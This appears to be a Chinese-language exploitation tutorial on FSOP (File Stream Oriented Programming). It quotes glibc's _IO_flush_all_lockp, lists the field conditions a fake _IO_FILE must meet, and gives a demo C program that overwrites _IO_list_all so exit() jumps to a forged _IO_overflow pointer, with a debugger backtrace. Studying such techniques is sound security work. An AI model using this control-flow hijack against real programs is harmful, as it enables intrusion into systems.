---
title: 【IO_FILE】FSOP
index_img: img/article/fsop/abort_routine.001.jpeg
excerpt: FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。
---

> FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。另外由于网络上很多IO_FILE相关博客含有相关glibc源代码，但是并没有源代码的完整部分或者链接。在之后的博客中，我会包含该段代码在哪里可以查看得到。

## 介绍

FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。

```c
//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif

  return result;
}
```

![img](img/article/fsop/abort_routine.001.jpeg)

而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：

- 当 libc 执行 abort 流程时
- 当执行 exit 函数时
- 当执行流从 main 函数返回时

## 梳理

梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为`_IO_list_all `是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写`_IO_list_all`。

之后需要用任意地址写把`_IO_list_all` 的内容改为指向我们可控内存的指针，

之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;
```

这里其实是两个条件二选一

1. fp->_mode <= 0 && fp-> _IO_write_ptr > fp-> _IO_write_base
2. _IO_vtable_offset (fp) == 0 && fp-> _mode > 0 && (fp->wide_data-> _IO_write_ptr > fp-> _wide_data-> _IO_write_base)

但是vtable显然不会设置为0，那么就要满足条件1，拆分出来两个部分

- fp->_mode <= 0 
- fp->_IO_write_ptr > fp-> _IO_write_base

在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和 _IO_FILE_plus。 为了绕过验证，我们提前获得了 _IO_write_ptr、 _IO_write_base、 _mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据

```
#define _IO_list_all 0x7ffff7dd2520
#define mode_offset 0xc0
#define writeptr_offset 0x28
#define writebase_offset 0x20
#define vtable_offset 0xd8

int main(void)
{
    void *ptr;
    long long *list_all_ptr;

    ptr=malloc(0x200);

    *(long long*)((long long)ptr+mode_offset)=0x0;
    *(long long*)((long long)ptr+writeptr_offset)=0x1;
    *(long long*)((long long)ptr+writebase_offset)=0x0;
    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);

    *(long long*)((long long)ptr+0x100+24)=0x41414141;

    list_all_ptr=(long long *)_IO_list_all;

    list_all_ptr[0]=ptr;

    exit(0);
}
```

我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的 _IO_overflow 指针。

之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的 _IO_FILE_plus。

通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush 获取 _IO_list_all 的值并取出作为 _IO_FILE_plus 调用其中的 _IO_overflow

```c
---> call _IO_overflow
[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock=0x0)
[#1] 0x7ffff7a8932a → Name: _IO_cleanup()
[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status=0x0, listp=<optimized out>, run_list_atexit=0x1)
[#3] 0x7ffff7a47045 → Name: __GI_exit(status=<optimized out>)
[#4] 0x4005ce → Name: main()
```